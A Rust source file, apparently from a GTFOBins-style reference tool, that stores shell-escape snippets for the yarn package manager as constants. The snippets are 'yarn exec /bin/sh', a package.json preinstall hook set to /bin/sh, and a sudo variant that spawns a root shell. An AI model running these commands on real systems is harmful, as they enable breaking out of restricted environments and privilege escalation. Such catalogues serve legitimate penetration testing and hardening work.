pub static BIN_NAME: &'static str = "yarn";
pub static SH_CODE_1: &'static str = r#"
    
    yarn exec /bin/sh
"#;
pub static SH_DESC_2: &'static str = "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`.";
pub static SH_CODE_2: &'static str = r#"
    
    TF=$(mktemp -d)
    echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
    yarn --cwd $TF install
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo yarn exec /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SHELL_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SHELL_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
